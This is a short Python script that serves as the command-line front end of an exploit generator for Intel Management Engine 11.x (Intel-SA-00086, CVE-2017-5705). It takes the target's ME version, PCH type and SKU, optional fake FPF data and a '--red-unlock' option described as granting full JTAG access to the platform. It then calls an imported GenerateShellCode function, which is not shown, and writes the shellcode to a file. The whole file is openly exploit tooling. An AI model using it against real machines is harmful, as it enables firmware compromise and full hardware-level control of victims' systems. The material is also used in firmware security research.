#!/usr/bin/python3
# SPDX-License-Identifier: GPL-2.0-only

import argparse
from lib.exploit import GenerateShellCode

parser = argparse.ArgumentParser(description="Intel-SA-00086 (CVE-2017-5705) exploit generator for ME 11.x.x.x")
parser.add_argument('-o', '--output', metavar='<output path>', help='output file path', required=True)
parser.add_argument('-v', '--version', metavar='<ME version>', help='ME version', required=True)
parser.add_argument('-p', '--pch', metavar='<PCH type>', help='PCH type', required=True)
parser.add_argument('-s', '--sku', metavar='<ME SKU>', help='ME SKU', required=True)
parser.add_argument('--fake-fpfs', metavar='<FPF data path>', help='replace SRAM copy of FPFs with the provided data')
parser.add_argument('--red-unlock', help='allow full JTAG access to the entire platform', action='store_true')
args = parser.parse_args()

fake_fpfs = None
if args.fake_fpfs:
    with open(args.fake_fpfs, "rb") as f:
        fake_fpfs = f.read()

data = GenerateShellCode(args.version, args.pch, args.sku, fake_fpfs, args.red_unlock)

with open(args.output, "wb") as f:
    f.write(data)
